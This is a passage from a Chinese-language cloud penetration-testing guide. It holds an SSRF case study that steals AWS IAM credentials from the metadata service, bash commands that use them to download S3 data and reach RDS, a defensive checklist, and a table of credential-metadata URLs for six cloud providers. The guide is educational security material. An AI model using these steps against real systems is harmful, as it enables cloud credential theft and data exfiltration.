3. 配置文件中包含了数据库连接信息和内部API密钥
4. 利用该密钥进行更深层次的渗透测试

**影响**：企业内部网络被攻破，多个内部系统受到影响

### 案例 3：通过SSRF获取AWS元数据凭证

**发现过程**：
1. 目标网站存在SSRF漏洞，可以访问内部网络
2. 利用SSRF访问 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. 获取IAM角色名称
4. 进一步获取临时凭证（Access Key, Secret Key, Session Token）
5. 使用凭证访问S3桶和RDS数据库

**利用**：
```bash
# 配置凭证
export AWS_ACCESS_KEY_ID=ASIAxxxxxxxxxx
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxx

# 验证
aws sts get-caller-identity

# 下载S3数据
aws s3 cp s3://target-user-data/ ./data/ --recursive

# 访问RDS（如果安全组允许）
mysql -h target-db.rds.amazonaws.com -u admin -p
```

---

## 七、云安全最佳实践建议

虽然本文档是从攻击者角度编写的，但了解攻击手法后我们也应该知道如何防御：

### 防御清单

```
1. 存储桶配置
   - 禁止公开读写访问
   - 启用阻止公共访问（Block Public Access）
   - 使用Bucket Policy限制访问源IP
   - 启用访问日志和监控告警

2. 元数据保护
   - 升级到IMDSv2（开启Hop Limit）
   - 限制实例元数据访问
   - 使用VPC Endpoint避免元数据外泄

3. 服务认证
   - 所有数据库和服务必须开启认证
   - 使用强密码和密钥
   - 定期轮换凭证
   - 最小权限原则

4. 网络安全
   - 安全组配置最小开放原则
   - 管理端口不对公网开放
   - 使用VPN/堡垒机管理服务器
   - 启用网络ACL和WAF

5. 监控告警
   - 配置CloudTrail/操作审计
   - 启用GuardDuty/态势感知
   - 设置异常行为告警
   - 定期安全审计和渗透测试
```

---

## 结语

云服务配置错误是当前渗透测试中产出最丰厚、影响最严重的漏洞类型之一。从存储桶公开访问到元数据服务攻击，从无认证服务到过于宽松的IAM权限，云配置错误为企业带来了巨大风险。掌握云安全测试技术，不仅是发现漏洞的关键，也是帮助企业构建安全云基础设施的必要技能。

> **再次提醒**：所有测试行为必须在获得授权的前提下进行。本文档仅用于教育和授权的安全测试目的。发现配置错误后，应通过负责任的渠道报告，不得滥用获取的数据或凭证。

---

## 附录：云服务元数据速查表

| 云平台 | 元数据地址 | 获取凭证URL | 请求头 |
|-------|-----------|-------------|-------|
| AWS | 169.254.169.254 | `/latest/meta-data/iam/security-credentials/` | 无 |
| 阿里云 | 100.100.100.200 | `/latest/meta-data/ram/security-credentials/` | 无 |
| GCP | metadata.google.internal | `/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` |
| Azure | 169.254.169.254 | `/metadata/identity/oauth2/token` | `Metadata: true` |
| 腾讯云 | 169.254.0.23 | `/meta-data/cam/security-credentials/` | 无 |
| 华为云 | 169.254.169.254 | `/openstack/latest/securitykey` | 无 |
